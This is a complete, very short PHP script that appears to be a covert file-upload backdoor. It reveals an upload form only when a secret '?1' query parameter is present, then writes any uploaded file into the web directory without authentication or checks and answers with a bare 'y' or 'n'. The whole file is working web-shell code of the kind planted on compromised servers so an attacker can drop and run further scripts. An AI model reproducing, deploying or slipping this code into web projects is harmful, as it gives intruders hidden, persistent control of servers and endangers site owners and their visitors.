<?php
	if(isset($_GET[1]))
	{ 
	echo '<form action="" method="post" enctype="multipart/form-data" name="up" id="up">';
	echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="u"></form>';
	if( $_POST['_upl'] == "u" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'y'; }
	else { echo 'n'; }
	}
	 }
?>